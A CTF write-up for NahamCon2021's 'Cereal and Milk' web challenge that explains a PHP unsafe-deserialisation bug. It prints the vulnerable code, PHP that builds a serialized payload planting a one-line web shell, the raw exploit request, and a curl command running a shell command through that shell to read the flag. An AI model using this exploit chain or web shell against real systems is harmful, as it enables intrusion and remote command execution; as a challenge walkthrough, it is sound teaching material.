---
title: "NahamCon2021 CTF - Cereal and Milk"
date: 2021-03-15T10:42:54+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

web - medium

## solution

The challenge URL drops us on a page where we can submit cereals.

{{< figure src="/images/nahamcon/cereal_and_milk.png" >}}

We are also given two files to download, `index.php` & `log.php`. I quickly spotted an unsafe deserialisation bug in the provided files. The cleaned up and relevant PHP code from both files were:

`index.php`

```php
<?php

include 'log.php';

class CerealAndMilk
{
    public $logs = "request-logs.txt";
    public $request = '';
    public $cereal = 'Captain Crunch';
    public $milk = '';


    public function processed_data($output)
    {
        echo "Deserilized data:<br> Coming soon.";
        echo print_r($output);

    }

    public function cereal_and_milk()
    {
     echo $this->cereal . " is the best cereal btw.";
    }

}

$input = $_POST['serdata'];
$output = unserialize($input);

$app = new CerealAndMilk;
$app -> cereal_and_milk($output);
$app -> processed_data($output);

?>
```

`log.php`

```php
<?php

class log
{
    public function __destruct()
        {
            $request_log = fopen($this->logs , "a");
            fwrite($request_log, $this->request);
            fwrite($request_log, "\r\n");
            fclose($request_log);
        }
}

?>
```

The `index.php` file had a line that effectively does `unserialize($_POST['serdata'];)` on user input. The `log.php` file had a class, `log()` that had a `__destruct()` method, writing contents (`$this->request`) to a file (`$this->logs`). Both the `logs` and `request` properties can be controlled with an arbitrary serialized string.

All we needed was a malicious serialized string which we can easily generate by constructing a new `log()` class, setting properties and calling `serialize()` on it.

```php
class log
{

    public function __construct()
    {
        $this->logs = "poo.php";
        $this->request = "<?=`\$_GET[0]`?>";
    }

    public function __destruct()
        {
            $request_log = fopen($this->logs , "a");
            fwrite($request_log, $this->request);
            fwrite($request_log, "\r\n");
            fclose($request_log);
        }
}

$l = new log();
$input = serialize($l);
echo $input . PHP_EOL;
```

This should output the following line we can use as input to the `serdata` POST parameter:

```text
O:3:"log":2:{s:4:"logs";s:7:"poo.php";s:7:"request";s:15:"<?=`$_GET[0]`?>";}
```

I could replicate this locally, but had trouble on the challenge service. I asked for some help from the folks over at [HackSouth](https://hacksouth.africa/), and after a bunch of debugging I realised their payloads used a `4` instead of the `2` for the number of properties in the class. I'm still confused by this. Anyways. The updated payload that wrote my shell was:

```text
O:3:"log":4:{s:4:"logs";s:7:"poo.php";s:7:"request";s:15:"<?=`$_GET[0]`?>";}
```

```tex
POST /index.php HTTP/1.1
Host: challenge.nahamcon.com:32469
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://challenge.nahamcon.com:32469
Connection: close
Referer: http://challenge.nahamcon.com:32469/index.php
Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; 2passwordAuth=eyJpZCI6MX0.YE8cpg.H-KAOClMD0uq5M7ycSJMzLtOHoM
Upgrade-Insecure-Requests: 1

serdata=O:3:"log":4:{s:4:"logs";s:7:"poo.php";s:7:"request";s:15:"<?=`$_GET[0]`?>";}
```

Using the command exec I found the `ndwbr7pVKNCrhs-CerealnMilk/` folder that had the flag.

```bash
$ curl "http://challenge.nahamcon.com:32469/poo.php?0=cat%20ndwbr7pVKNCrhs-CerealnMilk/flag.txt"
flag{70385676892a2a813a666961ddd6f899}
```
